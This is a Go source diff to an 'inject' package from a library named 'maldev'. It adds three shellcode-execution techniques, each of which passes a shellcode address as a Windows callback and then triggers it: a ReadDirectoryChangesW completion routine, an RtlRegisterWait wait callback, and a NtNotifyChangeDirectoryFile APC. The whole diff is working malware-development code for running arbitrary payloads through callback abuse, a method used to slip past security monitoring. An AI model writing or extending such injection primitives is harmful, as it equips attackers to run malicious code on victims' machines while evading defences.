@@ -4,10 +4,12 @@ package inject
 
 import (
 	"fmt"
+	"os"
 	"syscall"
 	"unsafe"
 
 	"github.com/oioio-space/maldev/win/api"
+	"golang.org/x/sys/windows"
 )
 
 // CallbackMethod identifies the callback technique used for shellcode execution.
@@ -25,6 +27,18 @@ const (
 	// CallbackCertEnumSystemStore uses crypt32.CertEnumSystemStore to invoke
 	// the shellcode as a certificate store enumeration callback.
 	CallbackCertEnumSystemStore
+
+	// CallbackReadDirectoryChanges uses kernel32.ReadDirectoryChangesW to invoke
+	// shellcode as a directory change notification callback.
+	CallbackReadDirectoryChanges
+
+	// CallbackRtlRegisterWait uses ntdll.RtlRegisterWait to invoke shellcode
+	// as a wait callback on an event object.
+	CallbackRtlRegisterWait
+
+	// CallbackNtNotifyChangeDirectory uses ntdll.NtNotifyChangeDirectoryFile
+	// to invoke shellcode as an async APC completion.
+	CallbackNtNotifyChangeDirectory
 )
 
 // String returns the MSDN-style name for the callback method.
@@ -36,6 +50,12 @@ func (m CallbackMethod) String() string {
 		return "CreateTimerQueueTimer"
 	case CallbackCertEnumSystemStore:
 		return "CertEnumSystemStore"
+	case CallbackReadDirectoryChanges:
+		return "ReadDirectoryChangesW"
+	case CallbackRtlRegisterWait:
+		return "RtlRegisterWait"
+	case CallbackNtNotifyChangeDirectory:
+		return "NtNotifyChangeDirectoryFile"
 	default:
 		return "Unknown"
 	}
@@ -64,6 +84,12 @@ func ExecuteCallback(addr uintptr, method CallbackMethod) error {
 		return executeTimerQueue(addr)
 	case CallbackCertEnumSystemStore:
 		return executeCertEnum(addr)
+	case CallbackReadDirectoryChanges:
+		return executeReadDirChanges(addr)
+	case CallbackRtlRegisterWait:
+		return executeRtlRegisterWait(addr)
+	case CallbackNtNotifyChangeDirectory:
+		return executeNtNotifyChange(addr)
 	default:
 		return fmt.Errorf("unsupported callback method")
 	}
@@ -114,5 +140,132 @@ func executeCertEnum(addr uintptr) error {
 		0, // pArg
 		addr,
 	)
+	return nil
+}
+
+// executeReadDirChanges registers shellcode as an async completion routine via
+// ReadDirectoryChangesW, then triggers it by creating a file in the watched dir.
+func executeReadDirChanges(addr uintptr) error {
+	tmp, err := os.MkdirTemp("", "rdc-*")
+	if err != nil {
+		return fmt.Errorf("create temp dir: %w", err)
+	}
+	defer os.Remove(tmp)
+
+	p, _ := syscall.UTF16PtrFromString(tmp)
+	hDir, err := windows.CreateFile(
+		p,
+		windows.FILE_LIST_DIRECTORY,
+		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
+		nil,
+		windows.OPEN_EXISTING,
+		windows.FILE_FLAG_BACKUP_SEMANTICS|windows.FILE_FLAG_OVERLAPPED,
+		0,
+	)
+	if err != nil {
+		return fmt.Errorf("open temp dir: %w", err)
+	}
+	defer windows.CloseHandle(hDir)
+
+	buf := make([]byte, 4096)
+	var bytesReturned uint32
+	overlapped := new(windows.Overlapped)
+
+	ret, _, callErr := api.ProcReadDirectoryChangesW.Call(
+		uintptr(hDir),
+		uintptr(unsafe.Pointer(&buf[0])),
+		uintptr(len(buf)),
+		0,    // bWatchSubtree = FALSE
+		0x01, // FILE_NOTIFY_CHANGE_FILE_NAME
+		uintptr(unsafe.Pointer(&bytesReturned)),
+		uintptr(unsafe.Pointer(overlapped)),
+		addr, // lpCompletionRoutine = shellcode
+	)
+	if ret == 0 {
+		return fmt.Errorf("ReadDirectoryChangesW: %w", callErr)
+	}
+
+	// Trigger by creating then deleting a file in the watched directory.
+	dummy := tmp + "\\x"
+	os.WriteFile(dummy, []byte{}, 0600)  //nolint:errcheck
+	os.Remove(dummy)                     //nolint:errcheck
+	windows.SleepEx(50, true)
+	return nil
+}
+
+// executeRtlRegisterWait registers shellcode as a wait callback, then signals
+// the event to trigger it.
+func executeRtlRegisterWait(addr uintptr) error {
+	hEvent, err := windows.CreateEvent(nil, 1, 0, nil)
+	if err != nil {
+		return fmt.Errorf("CreateEvent: %w", err)
+	}
+	defer windows.CloseHandle(hEvent)
+
+	var hWait uintptr
+	const wtExecuteDefault = 0x00000000
+	r, _, callErr := api.ProcRtlRegisterWait.Call(
+		uintptr(unsafe.Pointer(&hWait)),
+		uintptr(hEvent),
+		addr,
+		0, // context
+		0, // timeout (fires immediately after signal)
+		wtExecuteDefault,
+	)
+	if r != 0 {
+		return fmt.Errorf("RtlRegisterWait: NTSTATUS 0x%X: %w", uint32(r), callErr)
+	}
+
+	windows.SetEvent(hEvent)  //nolint:errcheck
+	windows.SleepEx(100, true)
+	return nil
+}
+
+// executeNtNotifyChange registers shellcode as an APC via NtNotifyChangeDirectoryFile,
+// then triggers it by creating a file in the watched directory.
+func executeNtNotifyChange(addr uintptr) error {
+	tmp, err := os.MkdirTemp("", "ntnotify-*")
+	if err != nil {
+		return fmt.Errorf("create temp dir: %w", err)
+	}
+	defer os.Remove(tmp)
+
+	p, _ := syscall.UTF16PtrFromString(tmp)
+	hDir, err := windows.CreateFile(
+		p,
+		windows.FILE_LIST_DIRECTORY,
+		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE|windows.FILE_SHARE_DELETE,
+		nil,
+		windows.OPEN_EXISTING,
+		windows.FILE_FLAG_BACKUP_SEMANTICS|windows.FILE_FLAG_OVERLAPPED,
+		0,
+	)
+	if err != nil {
+		return fmt.Errorf("open temp dir: %w", err)
+	}
+	defer windows.CloseHandle(hDir)
+
+	buf := make([]byte, 4096)
+	overlapped := new(windows.Overlapped)
+
+	r, _, callErr := api.ProcNtNotifyChangeDirectoryFile.Call(
+		uintptr(hDir),
+		0,    // Event = NULL
+		addr, // ApcRoutine = shellcode
+		0,    // ApcContext
+		uintptr(unsafe.Pointer(overlapped)),
+		uintptr(unsafe.Pointer(&buf[0])),
+		uintptr(len(buf)),
+		0x01, // FILE_NOTIFY_CHANGE_FILE_NAME
+		0,    // WatchTree = FALSE
+	)
+	if r != 0 {
+		return fmt.Errorf("NtNotifyChangeDirectoryFile: NTSTATUS 0x%X: %w", uint32(r), callErr)
+	}
+
+	dummy := tmp + "\\x"
+	os.WriteFile(dummy, []byte{}, 0600)  //nolint:errcheck
+	os.Remove(dummy)                     //nolint:errcheck
+	windows.SleepEx(100, true)
 	return nil
 }
